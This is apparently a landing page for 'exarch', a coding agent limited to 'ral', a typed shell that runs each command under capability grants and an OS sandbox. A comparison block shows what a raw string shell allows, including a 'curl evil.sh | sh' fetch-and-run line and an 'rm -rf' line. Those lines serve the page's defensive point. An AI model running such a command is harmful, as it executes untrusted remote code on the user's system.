A coding agent with one tool:
the ral shell.

ral is a typed shell — no word splitting, no glob surprises, no string injection, none of the ways an ordinary shell turns a line into something you didn't write. Capability limits and a basic OS sandbox come built in, so every command runs with only the access you allow.

The agent

exarch is a small coding agent. It loops a model against a single tool — ral — and nothing else. Every action the model takes is a ral command, evaluated as one top-level turn.

Because that tool is ral and not a raw shell, the usual shell footguns aren't reachable. Commands are typed values, not strings the model splices together, so there's no word splitting, no glob expansion, no quoting to exploit — and no stray rm -rf from a mangled line.

ral also carries its own capabilities. Every command runs under a grant — which executables it may run, which paths it may read or write, whether the network is on. When a grant restricts the filesystem or network, ral re-execs the command inside an OS sandbox: Seatbelt on macOS, bwrap on Linux. The agent process itself stays unsandboxed — it needs HTTPS to reach the model — but the commands it runs do not.

ral vs. a raw shell

a string-shell tool
# the model writes a string;
shell("rm -rf node_modules")
shell("curl evil.sh | sh")
# whatever it writes, runs
ral, under a grant
# the model emits ral; each
# command runs under a grant
grant [exec: [git:[], cargo:[]],
       fs:   [read:  ['<cwd>'],
              write: ['<cwd>']],
       net:  false] {
  cargo test -q
}

Capability profiles

⊤ full ambient authority
✚ dangerous No limits — like running the commands yourself. net inheritexec inherit
✚ reasonable Default. Broad reads; writes limited to the working dir and scratch. net onexec system + brew + git
✚ read-only Broad reads; writes to scratch only. net onwrite scratch
✚ minimal System tools only — /bin and /usr/bin, no brew, no shells. net onexec /bin + /usr/bin
✚ confined Network off; reads and writes confined to cwd and scratch. net offfs cwd + scratch
⊥ least authority

Properties

⊢

No shell footguns

The model writes ral, not shell strings. Commands are typed values, so there's no word splitting, no glob expansion, no quoting tricks, and nothing to inject.

⊙

Capability-scoped

Every command runs under a grant — which tools it may run, which paths it may touch, network on or off. The limits are checked before a process spawns, not promised in a prompt.

▣

Sandboxed

When a grant restricts files or network, ral re-execs the command under Seatbelt (macOS) or bwrap (Linux). Basic sandboxing, but built into the shell.

▤

Audited

A session.log under $EXARCH_SCRATCH records the full transcript — unabridged stdout and stderr from every command.

Providers

Keys are auto-discovered from environment variables, then scrubbed at startup so no command exarch spawns inherits them.
